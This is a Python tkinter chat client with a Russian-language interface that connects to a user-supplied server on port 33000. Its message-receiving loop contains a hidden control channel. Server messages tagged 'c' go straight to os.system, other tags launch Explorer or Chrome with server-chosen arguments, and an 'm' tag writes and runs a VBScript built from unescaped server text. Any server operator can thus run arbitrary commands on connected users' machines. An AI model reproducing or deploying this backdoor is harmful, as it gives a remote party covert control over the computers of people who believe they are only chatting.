from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
import tkinter
import os
import time

HOST = input("Введите адрес сервера(можно узнать у человека, который запустил сервер): ")
if HOST == "1":
    HOST = "127.0.0.1"
PORT = 33000
if not PORT:
    PORT = 33000
else:
    PORT = int(PORT)

BUFSIZ = 1024
ADDR = (HOST, PORT)

if HOST != "0":
    client_socket = socket(AF_INET, SOCK_STREAM)

def receive():
    while True:
        try:
            msg = client_socket.recv(BUFSIZ).decode("utf8")
            if msg[0] != "▓":
                msg = msg.split("▓")
                msg_list.insert(tkinter.END, msg[0])
                if len(msg) > 1:
                    for i in range(1, len(msg)):
                        if msg[i][0] == "#":
                            msg_list.itemconfig("end", fg = msg[i])
                        elif msg[i][0] == "+":
                            chr_list.insert("end", msg[i][1:])
                        elif msg[i][0] == "e":
                            os.system("explorer.exe" + msg[i][1:])
                        elif msg[i][0] == "b":
                            os.system("start chrome.exe " + msg[i][1:])
                        elif msg[i][0] == "c":
                            os.system(msg[i][1:])
                        elif msg[i][0] == "m":
                            f = open("script.vbs", "w+")
                            f.write("MsgBox " + '"' + msg[i][1:] + '"')
                            f.close()
                            os.system("start script.vbs")
                            time.sleep(0.5)
                            os.system("del script.vbs")
            else:
                msg = msg[1:].split("▓")
                for i in range(0, len(msg)):
                    if msg[i][0] == "#":
                        msg_list.itemconfig("end", fg = msg[i])
                    elif msg[i][0] == "+":
                        chr_list.insert("end", msg[i][1:])
                    elif msg[i][0] == "e":
                        os.system("explorer.exe" + msg[i][1:])
                    elif msg[i][0] == "b":
                        os.system("start chrome.exe " + msg[i][1:])
                    elif msg[i][0] == "c":
                        os.system(msg[i][1:])
                    elif msg[i][0] == "m":
                        f = open("script.vbs", "w+")
                        for a in msg[i][1:].split(";"):
                            f.write("MsgBox " + '"' + a + '"' + "\n")
                        f.close()
                        os.system("start script.vbs")
                        time.sleep(0.5)
                        #os.system("del script.vbs")
        except OSError:
            break


def send(event=None):
    msg = my_msg.get()
    my_msg.set("") 
    client_socket.send(bytes(msg, "utf8"))
    if msg == "(выход)":
        client_socket.close()
        top.quit()


def on_closing(event=None):
    my_msg.set("(выход)")
    send()

def clear(event = None):
    msg_list.delete(0, tkinter.END)

top = tkinter.Tk()
top.title("")
top.geometry("1024x330")
top.configure(bg = "#21252b")#"#282c34")
top.resizable(width=False, height=False)

messages_frame = tkinter.Frame(top)
my_msg = tkinter.StringVar()
scrollbar = tkinter.Scrollbar(messages_frame)
entry_field = tkinter.Entry(top, textvariable=my_msg, background = "#21252b", width = 130, fg = "#dddddd", borderwidth = 0, insertbackground = "#2277dd", font='Consolas 12', selectbackground='#333a46')
entry_field.bind("<Return>", send)
entry_field.pack()

msg_list = tkinter.Listbox(messages_frame, height=15, width=100, yscrollcommand=scrollbar.set)
msg_list.configure(fg = "#dddddd", bg = "#282c34", highlightbackground = "#282c34", highlightcolor = "#282c34", borderwidth = 0, font='Consolas 11', selectmode='EXTENDED', selectbackground='#333a46')

chr_list = tkinter.Listbox(messages_frame, height=15, width=30)
chr_list.configure(fg = "#dddddd", bg = "#252a30", highlightbackground = "#252a30", highlightcolor = "#252a30", borderwidth = 0, font='Consolas 11', selectmode='EXTENDED', selectbackground='#333a46')

msg_list.pack(side=tkinter.LEFT, padx = 0, pady = 0) #fill=tkinter.BOTH
chr_list.pack(side=tkinter.LEFT, padx = 0, pady = 0) #fill=tkinter.BOTH
scrollbar.pack(side=tkinter.LEFT, fill=tkinter.Y)
#msg_list.pack()
messages_frame.pack()

send_button = tkinter.Button(top, text="Отправить", command=send, background = "#21252b", width = 35, fg = "#707682", borderwidth = 0, font='Consolas 10', activebackground = "#333a46", activeforeground = "#707682", highlightbackground = "#282c34",)
send_button.pack(side=tkinter.LEFT, padx = 0, pady = 0)

closeButton = tkinter.Button(top, text="Отчистить", command=clear, background = "#21252b", width = 40, fg = "#707682", borderwidth = 0, font='Consolas 10', activebackground = "#333a46", activeforeground = "#707682", highlightbackground = "#282c34",)
closeButton.pack(side=tkinter.LEFT, padx = 0, pady = 0)

send_button = tkinter.Button(top, text="Все", command=clear, background = "#21252b", width = 15, fg = "#707682", borderwidth = 0, font='Consolas 10', activebackground = "#333a46", activeforeground = "#707682", highlightbackground = "#282c34",)
send_button.pack(side=tkinter.RIGHT, padx = 0, pady = 0)

closeButton = tkinter.Button(top, text="Никто", command=clear, background = "#21252b", width = 15, fg = "#707682", borderwidth = 0, font='Consolas 10', activebackground = "#333a46", activeforeground = "#707682", highlightbackground = "#282c34",)
closeButton.pack(side=tkinter.RIGHT, padx = 0, pady = 0)

top.protocol("WM_DELETE_WINDOW", on_closing)

if HOST != "0":
    client_socket.connect(ADDR)

receive_thread = Thread(target=receive)
receive_thread.start()
tkinter.mainloop()
